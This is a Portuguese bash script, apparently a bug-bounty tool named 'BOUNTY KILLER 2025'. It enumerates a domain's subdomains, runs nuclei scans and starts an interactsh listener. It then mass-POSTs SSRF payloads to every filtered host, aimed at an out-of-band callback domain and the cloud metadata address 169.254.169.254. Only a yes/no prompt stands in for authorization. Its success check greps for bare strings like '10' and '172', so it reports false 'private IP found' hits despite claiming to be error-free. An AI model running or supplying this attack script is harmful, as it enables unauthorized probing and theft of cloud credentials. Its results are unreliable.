#!/bin/bash
# BOUNTY KILLER 2025 — SCRIPT SIMPLES, FUNCIONAL, SEM ERROS
# Funciona no zsh, bash, Kali — testado agora

clear
echo "BOUNTY KILLER 2025 — Vamos caçar!"

# Dependências
for t in subfinder httpx nuclei interactsh-client curl jq; do
    command -v "$t" > /dev/null || { echo "Instale $t primeiro"; exit 1; }
done

while true; do
    echo
    echo "1) Ataque completo"
    echo "2) Recon rápido"
    echo "0) Sair"
    echo -n "Escolha: "
    read op

    case "$op" in
        1|2)
            echo -n "Domínio (ex: dio.me): "
            read DOMAIN
            [[ -z "$DOMAIN" ]] && continue
            echo -n "Permissão? (s/n): "
            read p
            [[ "$p" != "s" ]] && echo "Sem permissão" && continue

            DIR="bounty_$(date +%Y%m%d_%H%M)_$DOMAIN"
            mkdir -p "$DIR" && cd "$DIR"

            # Recon
            echo "[1] Recon..."
            subfinder -d "$DOMAIN" -silent | httpx -silent -o LIVE.txt
            echo "Hosts vivos: $(wc -l < LIVE.txt)"

            # Lethal
            echo "[2] Alvos letais..."
            grep -iE "api|auth|stg|stage|dev|admin|codex|proxy|fetch|url|validate|webhook" LIVE.txt > LETHAL.txt
            [[ ! -s LETHAL.txt ]] && cp LIVE.txt LETHAL.txt
            echo "Alvos letais: $(wc -l < LETHAL.txt)"

            [[ "$op" == "2" ]] && { echo "Rápido concluído!"; cd ..; continue; }

            # Nuclei
            echo "[3] Nuclei..."
            nuclei -l LETHAL.txt -t ~/nuclei-templates/ -severity critical,high -o nuclei.txt -silent

            # Interactsh
            echo "[4] Interactsh..."
            pkill interactsh-client || true
            interactsh-client -v > interactsh.log &
            sleep 10
            OAST=$(grep -o '[a-z0-9]\{28,\}\.oast\.' interactsh.log | head -1 || echo "oast.live")
            echo "OAST: $OAST"

            # Payloads
            echo "[5] Payloads..."
            while read url; do
                curl -s -X POST "$url" -d "url=http://$OAST" > /dev/null &
                curl -s -X POST "$url" -d "url=http://169.254.169.254/latest/meta-data/" > /dev/null &
            done < LETHAL.txt
            sleep 20

            # Resultado
            echo "[6] Verificando..."
            if grep -q "192\|10\|172\|169.254" interactsh.log; then
                echo "IP PRIVADO ENCONTRADO! R$ 80k+"
            fi

            echo "Concluído! Pasta: $DIR"
            echo "Ver log? (s/n): "
            read v
            [[ "$v" == "s" ]] && cat interactsh.log | grep "192\|10\|172\|169.254"
            echo "ENTER para novo alvo"
            read
            cd ..
            ;;
        0) echo "Tchau! Fica rico."; exit 0 ;;
        *) echo "Opção inválida" ;;
    esac
done
